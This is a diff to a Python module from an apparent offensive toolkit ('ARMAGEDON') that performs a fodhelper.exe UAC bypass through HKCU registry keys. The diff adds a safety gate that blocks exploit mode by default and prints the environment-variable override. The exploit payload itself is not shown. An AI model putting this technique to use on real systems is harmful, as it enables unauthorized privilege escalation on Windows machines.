@@ -9,6 +9,29 @@ Requires: Medium integrity level (admin user with UAC enabled).
 
 import subprocess
 import shutil
+import os
+
+# ── SAFETY ──────────────────────────────────────────────────────────────
+# SAFE_MODE = True:  Only CHECK mode runs. EXPLOIT is blocked.
+# SAFE_MODE = False: EXPLOIT proceeds (modifies HKCU registry).
+#
+# WARNING: This exploit writes registry keys under HKCU (current user).
+#          It is relatively safe but leaves detectable artifacts. The
+#          registry keys are cleaned up after fodhelper.exe executes.
+# ────────────────────────────────────────────────────────────────────────
+SAFE_MODE = int(os.environ.get("ARMAGEDON_SAFE_MODE", "1"))
+_RISK = "MEDIUM"
+
+def _safety_gate(mode):
+    if SAFE_MODE and mode.upper() == "EXPLOIT":
+        print(f"\n  [!] ═══ SAFETY BLOCK ({_RISK} RISK) ═══")
+        print(f"  [!] SAFE_MODE=1 — exploit blocked.")
+        print(f"  [!] Writes HKCU registry keys for fodhelper auto-elevation.")
+        print(f"  [!] Relatively safe (HKCU only) but leaves artifacts.")
+        print(f"  [!] To run anyway: export ARMAGEDON_SAFE_MODE=0")
+        print(f"  [!] ═══════════════════════════════════════════════════\n")
+        return False
+    return True
 
 NAME = "UAC Bypass (Fodhelper/ComputerDefaults)"
 DESCRIPTION = "Bypass UAC via fodhelper.exe auto-elevation registry key"
@@ -124,6 +147,11 @@ def run(options=None, target=None, mode="CHECK", **kwargs):
         return result
 
     elif mode == "EXPLOIT":
+        if not _safety_gate(mode):
+            result["error"] = "BLOCKED — SAFE_MODE enabled. Export ARMAGEDON_SAFE_MODE=0 to override."
+            result["data"]["status"] = "BLOCKED"
+            return result
+
         try:
             # Method 1: fodhelper.exe
             exploit_ps = (
